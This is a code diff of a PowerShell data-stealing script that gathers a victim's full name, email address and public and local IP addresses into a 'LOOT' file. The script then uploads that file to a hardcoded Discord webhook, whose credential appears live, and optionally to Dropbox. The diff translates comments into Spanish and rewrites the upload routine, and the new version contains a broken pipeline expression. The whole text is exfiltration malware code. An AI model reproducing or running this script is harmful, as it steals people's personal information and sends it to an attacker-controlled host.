@@ -1,8 +1,8 @@
-# Define the Discord webhook URL
+# Define la URL del webhook de Discord
 $dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'
 
-# Define the Dropbox token
-$db = '' # Add your Dropbox token here
+# Define el token de Dropbox
+$db = '' # Añade aquí tu token de Dropbox
 
 $FileName = "$env:TEMP\$env:USERNAME-LOOT-$(Get-Date -Format yyyy-MM-dd_hh-mm).txt"
 
@@ -37,7 +37,7 @@ $email = Get-Email
 #------------------------------------------------------------------------------------------------------------------------------------
 
 try {
-    $computerPubIP = (Invoke-WebRequest -Uri "https://ipinfo.io/ip" -UseBasicPParsing).Content
+    $computerPubIP = (Invoke-WebRequest -Uri "https://ipinfo.io/ip").Content
 } catch {
     $computerPubIP = "Error getting Public IP"
 }
@@ -54,7 +54,7 @@ Full Name: $fullName
 Email: $email
 
 ------------------------------------------------------------------------------------------------------------------------------
-Public IP: 
+Public IP:
 $computerPubIP
 
 Local IPs:
@@ -69,7 +69,6 @@ $output | Out-File -FilePath $FileName
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Upload-Discord {
-    [CmdletBinding()]
     param (
         [string]$file,
         [string]$text
@@ -88,13 +87,18 @@ function Upload-Discord {
 
     if (-not [string]::IsNullOrEmpty($file)) {
         $fileContent = [System.IO.File]::ReadAllBytes($file)
-        $multipartFormDataContent = New-Object 'System.Net.Http.MultipartFormDataContent'
-        $fileContentStream = [System.IO.MemoryStream]::new($fileContent)
-        $fileContentStream.Position = 0
-        $fileContentStreamContent = New-Object 'System.Net.Http.StreamContent'($fileContentStream)
-        $fileContentStreamContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new('application/octet-stream')
-        $multipartFormDataContent.Add($fileContentStreamContent, 'file1', [System.IO.Path]::GetFileName($file))
-        Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartFormDataContent
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $body = "--$boundary`r`n"
+        $body += "Content-Disposition: form-data; name=`"file1`"; filename=`"$($file | [System.IO.Path]::GetFileName())`"`r`n"
+        $body += "Content-Type: application/octet-stream`r`n`r`n"
+        $body += [System.Text.Encoding]::ASCII.GetString($fileContent)
+        $body += "`r`n--$boundary--`r`n"
+        
+        $headers = @{
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        }
+
+        Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -Headers $headers
     }
 }
 
@@ -103,7 +107,6 @@ if (-not [string]::IsNullOrEmpty($dc)) { Upload-Discord -file $FileName }
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function DropBox-Upload {
-    [CmdletBinding()]
     param (
         [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
         [Alias("f")]
